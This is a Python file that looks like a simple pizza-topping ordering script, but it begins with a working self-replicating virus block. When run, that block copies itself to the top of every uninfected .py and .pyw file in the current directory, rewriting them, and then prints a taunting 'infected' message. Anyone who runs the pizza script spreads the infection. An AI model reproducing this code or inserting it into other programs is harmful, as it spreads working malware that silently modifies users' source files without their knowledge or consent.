# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)


def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")


malicious_code()

# VIRUS SAYS BYE!
available_pizza_toppings = ["pepperoni", "sausage", "cheese", "mushrooms", "tomato sauce", "pineapple", "olives"]
requested_customer_toppings = []
stop = False
while not stop:
    topping = input("write your toppings here (press q to continue) : ")
    if topping != "q":
        requested_customer_toppings.append(topping)
    else:
        stop = True

for requested_customer_toppings in requested_customer_toppings:
    if requested_customer_toppings in available_pizza_toppings:
        print(f"Adding {requested_customer_toppings}")
    else:
        print(f"Sorry the topping for {requested_customer_toppings} that you`re looking for is either not in the "
              f"topping`s list or a typo has happened")

print("\nwe have finished making your pizza")